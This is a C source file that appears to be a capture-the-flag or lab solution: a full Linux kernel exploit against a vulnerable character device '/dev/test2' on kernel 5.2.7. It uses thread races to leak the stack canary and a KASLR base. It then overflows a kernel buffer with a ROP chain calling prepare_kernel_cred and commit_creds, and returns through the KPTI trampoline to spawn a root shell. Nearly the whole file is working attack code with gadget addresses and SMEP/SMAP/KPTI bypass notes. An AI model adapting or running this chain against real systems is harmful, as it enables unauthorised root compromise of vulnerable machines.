/*linux-5.2.7 -cpu kvm64,smap,smep kaslr*/
/*Different threads got different kernel canaries(as well as userspace ones), so the leak must be done in main thread*/
/*originally wanted to disable smap/smep by setting cr4 to 0xdf0, but further experiment showed thatthis still causes page fault upon ret2user
  after some experiments, i noticed that kpti is enabled by default for "-cpu kvm64,+smep", which also explains the segfault error code*/
/*interestingly, cpu type qemu64 disables kpti by default...*/

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/fcntl.h>
#include<pthread.h>

/*Addr*/
unsigned long long int fsnotify_ret_offset = 0xffffffff81426939;
unsigned long long int prepare_kernel_cred_offset = 0xffffffff810b9550;
unsigned long long int commit_creds_offset = 0xffffffff810b91e0;

/*ROPgadget*/
unsigned long long int K_pop_rdi = 0xffffffff8125894d;
unsigned long long int K_mov_cr4_rdi_pop1 = 0xffffffff810209a0;
unsigned long long int K_mov_rsp0x98val_rax_pop18 = 0xffffffff81066778;
unsigned long long int K_swapgs_pop1 = 0xffffffff8106c984;
unsigned long long int K_iretq = 0xffffffff810bf1b3;
unsigned long long int K_xor_rdi_rax_pop1 = 0xffffffff812c66f5;
unsigned long long int K_restore_cr3_pop2_pop_rsp_swapgs_sysretq = 0xffffffff81c0011a;
unsigned long long int swapgs_restore_regs_and_return_to_usermode_stub = 0xffffffff81c00a4a;
	/*mov rdi, rsp
	  mov rsp, QWORD PTR gs:0x6004
	  push QWORD PTR [rdi+0x30]
	  push QWORD PTR [rdi+0x28]
	  push QWORD PTR [rdi+0x20]
	  push QWORD PTR [rdi+0x18]
	  push QWORD PTR [rdi+0x10]
	  push QWORD PTR [rdi]
	  push rax
	  xchg ax,ax
	  mov rdi, cr3
	  jmp TAG1:
	  TAG1:
	  or rdi, 0x1000
	  mov cr3, rdi
	  pop rax
	  pop rdi
	  swapgs
	  nop DWORD PTR [rax]
	  jmp TAG2
	  TAG2:
	  test BYTE PTR [rsp+0x20], 0x4
	  jne SOMEWHERE_ELSE
	  iretq
	  SOMEWHERE_ELSE:*/

/*Values to leak*/
unsigned long long int canary;
unsigned long long int kaslr;
unsigned long long int user_cs;
unsigned long long int user_ss;
unsigned long long int user_rflags;

pthread_t writet,closet;
int fd1,fd2;
int writeres,readres;;
char writebuf[0x400],readbuf[0x400];
int writelock,readlock,closelock,overflowlock;

void get_shell(){
  system("/bin/sh");
  return;
}

void save_state(){
  asm("movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "pushfq\n"
      "popq %2\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
      :
      : "memory");
  return;
}

void printerror(char *msg){
  puts(msg);
  exit(0);
}

void* writerace(void *res){
  while(writelock==1){}
  readlock=0;
  overflowlock=0;
  *(int*)res=write(fd1,writebuf,0xff);
  return NULL;
}

void* closerace(void *arg){
  while(closelock==1){}
  close(fd2);
  return NULL;
}

int main(){
  puts("Racing for leak");
  while(1){
    fd1 = open("/dev/test2",O_RDWR);
    fd2 = open("/dev/test2",O_RDWR);
    if(fd1<0 || fd2<0)
      printerror("Open Failed");
    write(fd1,"a",1);
    writelock=1;
    readlock=1;
    closelock=1;
    if(pthread_create(&writet,NULL,writerace,&writeres)!=0 || pthread_create(&closet,NULL,closerace,NULL)!=0)
      printerror("Create Thread Failed");
    writelock=0;
    while(readlock==1){}
    closelock=0;
    readres = read(fd1,readbuf,0x200);
    if(pthread_join(writet,NULL)!=0 || pthread_join(closet,NULL)!=0)
      printerror("Join Thread Failed");
    printf("Attemp >> read : %d, write : %d\n",readres,writeres);
    close(fd1);
    if(readres>=0x128){
      canary = *((unsigned long long*)&readbuf[0x100]);
      unsigned long long int fsnotify_ret_addr = *((unsigned long long*)&readbuf[0x178]);
      kaslr = fsnotify_ret_addr-fsnotify_ret_offset;
      printf("kaslr : %lx, canary : %lx\n",kaslr,canary);
      break;
    }
  }

  puts("Preparing ROPchain");
  char stack_marker[0x10];
  save_state();
  printf("cs : %lx, rflags : %lx, ss : %lx\n",user_cs,user_rflags,user_ss);
  unsigned long long int ROPchain[] = {kaslr+K_pop_rdi,0,
				       kaslr+prepare_kernel_cred_offset,
				       kaslr+K_pop_rdi,0,
				       kaslr+K_xor_rdi_rax_pop1,0,
				       kaslr+commit_creds_offset,
				       kaslr+swapgs_restore_regs_and_return_to_usermode_stub,0,0,(unsigned long long int)get_shell,user_cs,user_rflags,(unsigned long long int)stack_marker,user_ss};
  *((unsigned long long int*)&writebuf[0x100]) = canary;
  memcpy(&writebuf[0x120],ROPchain,sizeof(ROPchain));
  memcpy(writebuf,&writebuf[0x100],0x20+sizeof(ROPchain));

  puts("Racing for overflow memcpy");
  while(1){
    fd1 = open("/dev/test2",O_RDWR);
    fd2 = open("/dev/test2",O_RDWR);
    if(fd1<0 || fd2<0)
      printerror("Open Failed");
    writelock=1;
    overflowlock=1;
    if(pthread_create(&writet,NULL,writerace,&writeres)!=0)
      printerror("Create Thread Failed");
    writelock=0;
    while(overflowlock==1){}
    close(fd2);
    if(pthread_join(writet,NULL)!=0)
      printerror("Join Thread Failed");
    printf("Attemp >> write : %d\n",writeres);
    puts("continue?");
    getchar();
    read(fd1,readbuf,0x200);
  }
  return 0;
}
